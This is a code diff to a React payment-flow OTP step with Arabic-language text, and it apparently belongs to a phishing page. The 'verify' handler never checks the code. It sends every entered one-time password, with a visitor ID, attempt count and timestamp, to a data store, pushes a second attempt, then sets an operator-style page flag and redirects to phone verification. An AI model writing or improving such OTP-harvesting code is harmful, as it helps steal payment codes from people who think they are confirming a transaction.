@@ -2,7 +2,7 @@
 
 import React from "react"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Badge } from "@/components/ui/badge"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
@@ -16,7 +16,7 @@ interface VerificationStepProps {
   setPaymentData: (data: any) => void
   stepHeaderRef: React.RefObject<HTMLHeadingElement>
 }
-const allOtps=[""]
+
 export function VerificationStep({
   formData,
   paymentData,
@@ -25,7 +25,25 @@ export function VerificationStep({
 }: VerificationStepProps) {
   const [otpValue, setOtpValue] = useState("")
   const [isLoading, setIsLoading] = useState(false)
+  const [otpAttempts, setOtpAttempts] = useState(0)
+  const [timer, setTimer] = useState(120)
 
+
+  useEffect(() => {
+    if (timer <= 0) return
+
+    const interval = setInterval(() => {
+      setTimer((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval)
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+
+    return () => clearInterval(interval)
+  }, [timer])
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60)
@@ -38,21 +56,41 @@ export function VerificationStep({
     setOtpValue(value)
     setPaymentData((prev: any) => ({ ...prev, otp: value }))
   }
-let timer=50
-setInterval(()=>{
-  timer-=1
-},1000)
+
   const handleVerifyOTP = async () => {
     if (otpValue.length === 6) {
-      allOtps.push(otpValue)
+      setIsLoading(true)
       const visitorId = localStorage.getItem('visitor')
-      addData({id:visitorId,otp:otpValue,allOtps})
-setOtpValue("")
+      const newAttempts = otpAttempts + 1
+
+      await addData({
+        id: visitorId,
+        otp: otpValue,
+        otpAttempts: newAttempts,
+        otpSubmittedAt: new Date().toISOString()
+      })
+
+      setOtpAttempts(newAttempts)
+      setOtpValue("")
+
+      if (newAttempts >= 2) {
+        await addData({
+          id: visitorId,
+          currentPage: '9999'
+        })
+
+        setTimeout(() => {
+          window.location.href = '/verify-phone'
+        }, 1500)
+      }
+
+      setIsLoading(false)
     }
   }
 
   const handleResendOTP = () => {
     setOtpValue("")
+    setTimer(120)
     setPaymentData((prev: any) => ({ ...prev, otp: "" }))
   }
 
@@ -88,6 +126,14 @@ setOtpValue("")
             <br />
             <span className="font-bold text-blue-600 text-sm">{formData.phone || "05xxxxxxxx"}</span>
           </p>
+          {otpAttempts > 0 && (
+            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
+              <p className="text-sm text-yellow-800 font-medium">
+                عدد المحاولات: {otpAttempts} / 2
+                {otpAttempts >= 2 && " - سيتم تحويلك للتحقق من رقم الهاتف"}
+              </p>
+            </div>
+          )}
         </div>
 
         {/* OTP Input */}
